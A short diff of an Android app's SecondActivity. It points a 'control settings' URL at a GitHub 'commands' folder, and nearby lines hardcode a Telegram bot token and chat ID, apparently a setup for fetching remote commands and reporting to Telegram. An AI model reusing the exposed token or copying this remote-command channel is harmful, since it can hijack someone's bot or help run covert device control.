@@ -31,7 +31,7 @@ public class SecondActivity extends AppCompatActivity {
     private Runnable refreshRunnable;
 
     // --- إعدادات التحكم (يجب تعديلها) ---
-    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/username/repository/main/commands/";
+    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/abdullah14120/ban/refs/heads/main/commands/";
     private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
     private final String CHAT_ID = "1749638488";
 
